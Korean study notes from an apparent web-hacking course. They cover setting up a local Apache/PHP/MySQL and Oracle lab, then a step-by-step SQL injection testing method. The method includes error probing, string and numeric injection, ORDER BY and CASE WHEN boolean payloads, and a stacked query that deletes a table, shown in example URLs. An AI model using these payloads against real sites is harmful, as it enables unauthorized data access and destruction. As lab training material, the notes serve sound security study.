1. APMSetup 설치
 1) APMSetup 설치 
 apmsetup 검색하여 다운로드
 
 2) Mysql password 변경 -> apmsetup
>select user();
>update mysql.user set password=password('gh1015') where user='root';
>flush privileges;

 3) php.ini 
C:\APM_Setup
php.ini 파일에서 magic_quotes-gpc=On -> Off로 변경 후 아파치 재부팅

C:\APM_Setup\Server\Apache\bin\ApacheMonitor.exe

2. ORACLE 설치 및 PHP 연동
 1) ORACLE 다운로드 및 설치 
검색 : oracle download express 

 2) ORACLE + PHP 연동 및 테스트 

* 취약점 점검 방법론
취약점 분석 : 에러 유/무 확인, 취약점 유/무 확인, 조건 구문 완성
 Step12) 에러 유/무 확인 - DBMS 에러 발생으로 DBMS 종류 파악
 숫자입력창
  select * from board where idx=192 //올바른 구문
  select * from board where idx=a X //올바르지 않은 구문
  
 문자 입력창
  select * from member where id='crehacktive' O //올바른 구문
  select * from member where id='crehack'tive' X //올바르지 않은 구문
  
 Step2-1) 취약점 유/무 확인 - 데이터 타입 : 문자형
  select * from member where id='crehacktive' //O
  select * from member where id='crehack'||'tive' //ORACLE
  select * from member where id='crehack'a'tive' //MSSQL
  select * from member where id='crehack'+'tive' //MYSQL(+ = %2B)
  
 Step2-2) 취약점 유/무 확인 - 데이터 타입 : 숫자형
  select * from board where idx=192 //O
  select * from board where idx=192-1 //점검 구문
  select * from board where idx=192+3 //점검 구문(192%2b3)
   
 Step2-2) 취약점 유/무 확인 - 테이블 (tbname, tb_name 등)
  select * from board_notice ORDER BY idx desc //사용자 입력 : board_notice
  select * from board_notice where 1=1 ORDER BY idx desc //사용자 입력 : where 1=1-- 데이터 조회 성공
  select * from board_notice where 2=1 ORDER BY idx desc //사용자 입력 : where 2=1 데이터 조회 실패 
  
  http://localhost.jsp?tbname=notice+where+1=1, 1=2
  
 Step2-3) 취약점 유/무 확인 - 컬럼(WHERE 절)
  select * from board_notice WHERE [title] like %% //[]는 사용자 입력, 데이터 조회 성공
  select * from board_notice WHERE [1] like %% //숫자, 데이터 조회 성공
  select * from board_notice WHERE [a] like %%//문자, 데이터 조회 실패 
 
  http://localhost.jsp?search_column=1, a
  
 Step2-4) 취약점 유/무 확인 - 컬럼(ORDER BY 절)  
  select * from board_notice ORDER BY [idx] desc //데이터 조회 성공, 사용자 입력 값 
  select * from board_notice ORDER BY [1] desc //데이터 조회 성공, 사용자 입력 값 : 1이상의 숫자 값
  select * from board_notice ORDER BY [a] desc //에러발생 : 데이터 조회 실패 
   
  http://localhost.jsp?sort_column=1 //select * from board_notice ORDER BY 1 desc
  http://localhost.jsp?sort_column=a //select * from board_notice ORDER BY a desc
   
 Step2-5) 취약점 유/무 확인 - 키워드(ORDER BY 절) 
  select * from board_notice ORDER BY idx [desc] //데이터 조회 성공, 사용자 입력 값 
  select * from board_notice ORDER BY idx[,1] //데이터 조회 성공, 사용자 입력 값 : 1이상의 숫자 값
  select * from board_notice ORDER BY idx [a] //에러발생 : 데이터 조회 실패
  
  http://website.co.kr/boardList.jsp?sort=,1 //select * from board_notice ORDER BY idx,1 -> sort파라미터에 [,1] 입력 
  http://website.co.kr/boardList.jsp?sort=a //select * from board_notice ORDER BY idx a -> 에러반환

SQL 인젝션 구문 종류 
 In-Line Query : select * from ask where idx=[192 and 1=1] and user_id='hacker'
 Terminating Query : select * from ask where [idx=192 and 1=1--] and user_id='hacker'
 Stack Query : select * from ask where idx=[192;delete from ask--] and user_id='hacker' //MSSQL 환경에서만 가능함
   
 Step3-1) 조건 구문 완성 - 데이터 타입 : 문자형 
  취약 우뮤 확인 후 조건 구문 완성해야됨
  In-line Query : select * from member where user_id='[hacker' and 1=1 and '1'='1]'
  Terminating Query : select * from member where user_id='[hacker' and 1=1--]'
   
  http://website.co.kr/mypage.jsp?id=[hacker' and 1=1 and '1'='1] // select * from member where id='hacker' and '1'='1'
  http://website.co.kr/mypage.jsp?id=[hacker' and 1=1--] //select * from member where id='hacker' and 1=1--'
 
 Step3-2) 조건 구문 완성 - 데이터 타입 : 숫자형
  In-line Query : select * from ask where idx=[192 and 1=1] and and user_id='hacker'
  Terminating Query : select * from ask where idx=[192 and 1=1--] and user_id='hacker'
  
  http://website.co.kr/boardView.jsp?idx=[192+and+1=1] // select * from board where idx=[192 and 1=1]
  http://website.co.kr/boardView.jsp?idx=[192+and+1=1--] // select * from board where idx=[192 and 1=1--]
   
  Terminating Query 사용이 되지 않고, In-line Query 사용시 논리 연산자 사용이 되지 않을 경우 -> 연결 연산자와 CASE WHEN 구문 
 
 Step3-3) 조건 구문 완성 - CASE WHEN 구문 활용(1)
  In-line Query
  select * from ask WHERE idx=[(case when 1=1 then 9 else 3 end)]//9데이터 조회 성공
  
  Select * FROM member WHERE user_id=["||(case when 1=1 then 'hacker' else 'test' end)||"] //'hacker' 데이터 조회 성공
  
 Step3-3) 조건 구문 완성 - CASE WHEN 구문 활용(2)
  Query
  SELECT * FROM board ORDER BY [case when 1=1 then 1 else 2 end)] desc
  
  SELECT * FROM board ORDER BY [(case when 1=1 then idx else title end)] desc
 
 
 ----------------------------실습 2-1 취약점 분석 실습-----------------------------
 
 localhost/board/mysql/index.php?sort_column=(case when 1=1 then idx else title end)&sort=desc
 
 localhost/board/mysql/index.php?sort_column=(case when 1=2 then idx else title end)&sort=desc
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
   
   
   
   
   
   
   
   
   
   
   
   
   
  
